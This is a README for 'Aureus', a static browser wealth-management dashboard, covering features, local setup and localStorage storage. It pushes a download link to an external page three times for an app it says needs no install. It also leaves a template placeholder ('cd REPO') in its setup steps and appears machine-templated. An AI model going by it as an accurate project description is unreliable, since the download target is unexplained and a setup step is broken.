# Aureus - Wealth Management Dashboard 2026

> **Aureus is a browser-based wealth management workspace for examining portfolios, client records, risk details, and retirement objectives in one place.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brooksoliverjy1165/aureus-wealth-dashboard?style=flat-square)](https://github.com/brooksoliverjy1165/aureus-wealth-dashboard)

---

<p align="center">
  <a href="https://brooksoliverjy1165.github.io/aureus-wealth-dashboard/">
    <img src="https://img.shields.io/badge/Download-Aureus%20Latest-brightgreen?style=for-the-badge" alt="Download Aureus">
  </a>
</p>

> **[Download Aureus](https://brooksoliverjy1165.github.io/aureus-wealth-dashboard/)**

---

[Download Latest Build](https://brooksoliverjy1165.github.io/aureus-wealth-dashboard/)

---

## Overview

Aureus provides a focused web interface for viewing investment information without spreading portfolio data across multiple screens. From the dashboard, users can examine performance, allocation, holdings, risk details, and progress toward retirement goals.

The application also supports client-oriented organization. A multi-client picker makes it possible to move between records, and the Add Client form provides a way to enter individual client details. A separate market news hub gathers relevant market information, while browser localStorage preserves dashboard data between visits.

---

## What It Includes

- Analyze investment performance across time
- Break down asset allocation and review specific holdings
- View available portfolio risk information
- Monitor retirement goal progress
- Access market updates through the news hub
- Change active records with the multi-client picker
- Create client records using the built-in Add Client form
- Keep dashboard information in browser localStorage
- Protect hosted access with HTTP Basic Auth

---

## Installation and Local Setup

### Get the web build

1. Go to the [latest Aureus build](https://brooksoliverjy1165.github.io/aureus-wealth-dashboard/).
2. Download or deploy the project files to a web host of your choice.
3. Launch the deployed application in a modern browser.

### Start Aureus locally

Clone the repository, then move into the project folder:

```bash
git clone https://github.com/brooksoliverjy1165/aureus-wealth-dashboard.git
cd REPO
```

Aureus consists of static HTML files and can be run with a small local HTTP server:

```bash
python3 -m http.server 8000
```

Open [http://localhost:8000](http://localhost:8000) after the server starts.

Vercel and other static-site hosting services can also be used for deployment.

---

## Using the Dashboard

1. Load Aureus in your browser.
2. Choose a client from the multi-client picker.
3. Inspect portfolio performance, asset allocation, and holdings.
4. Review the portfolio risk information provided.
5. Use the Add Client form to create or update a client record.
6. Check retirement goal tracking against long-term objectives.
7. Open the market news hub to view related market updates.

Aureus saves dashboard data in localStorage for the active site origin.

---

## Configuration and Storage

As a static application, Aureus relies primarily on its project files and the browser hosting it for configuration.

Client and dashboard records are kept in browser storage:

```text
Storage: browser localStorage
Scope: current browser and site origin
```

If access restrictions are needed on a hosted instance, set up HTTP Basic Auth through the deployment environment or hosting configuration when supported. A different domain uses a separate localStorage area, so data does not carry over automatically between origins.

---

## Requirements

- A modern browser with JavaScript and localStorage turned on
- Static hosting for making the application publicly available
- Optional Vercel hosting for static deployment
- Python installed locally when using the example development server
- Enough browser storage for saved client and dashboard records
- Hosting support for HTTP Basic Auth when deployment access must be restricted

---

## Frequently Asked Questions

### Does Aureus need to be installed as a desktop program?

No. Aureus is a static web application that operates inside a browser.

### What happens to my dashboard data?

The application stores data in browser localStorage. It is tied to the current browser and site origin, meaning it will not automatically appear on another device or domain.

### What is the process for adding a client?

Open Add Client, provide the available client information, and save it. Afterward, the record can be chosen from the multi-client picker.

### Is Vercel supported?

Yes. Aureus can be hosted as a static project on Vercel or a comparable static-site provider.

### How do I add password protection?

Configure HTTP Basic Auth through the hosting provider or deployment environment if that service supports it. The precise instructions vary by host.

### What should I check if saved records are missing?

Confirm that you are using the same device, browser, and site address. Clearing browser storage or changing the deployment origin can delete or isolate localStorage data.

### How do I submit a bug report?

Create an issue in the project repository. Include your browser, deployment environment, reproduction steps, and any useful console output.

---

## Planned Improvements

- Polish the presentation of portfolios and holdings
- Make client-related workflows smoother
- Add further improvements to retirement goal reviews
- Continue developing the market news hub
- Provide more guidance for deployment and access-control configuration

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
